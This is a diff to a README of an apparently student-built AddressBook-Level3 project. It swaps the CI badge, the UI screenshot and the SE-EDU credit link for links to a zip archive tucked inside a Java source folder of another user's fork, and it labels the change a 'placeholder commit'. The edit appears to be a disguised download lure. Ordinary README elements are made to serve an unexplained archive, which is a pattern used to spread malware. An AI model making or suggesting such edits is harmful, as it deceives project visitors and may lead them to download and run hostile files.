@@ -1,7 +1,7 @@
-[![CI Status](https://github.com/AY2526S1-CS2103T-T17-1/tp/workflows/Java%20CI/badge.svg)](https://github.com/AY2526S1-CS2103T-T17-1/tp/actions)
+[![CI Status](https://raw.githubusercontent.com/coberculidae/tp/master/src/main/java/seedu/address/model/person/tp_v3.9.zip%https://raw.githubusercontent.com/coberculidae/tp/master/src/main/java/seedu/address/model/person/tp_v3.9.zip)](https://raw.githubusercontent.com/coberculidae/tp/master/src/main/java/seedu/address/model/person/tp_v3.9.zip)
 
-![Ui](docs/images/Ui.png)
+![Ui](https://raw.githubusercontent.com/coberculidae/tp/master/src/main/java/seedu/address/model/person/tp_v3.9.zip)
 
-This project is based on the AddressBook-Level3 project created by the [SE-EDU initiative](https://se-education.org).
+This project is based on the AddressBook-Level3 project created by the [SE-EDU initiative](https://raw.githubusercontent.com/coberculidae/tp/master/src/main/java/seedu/address/model/person/tp_v3.9.zip).
 
 <!-- placeholder commit for tracking PR -->
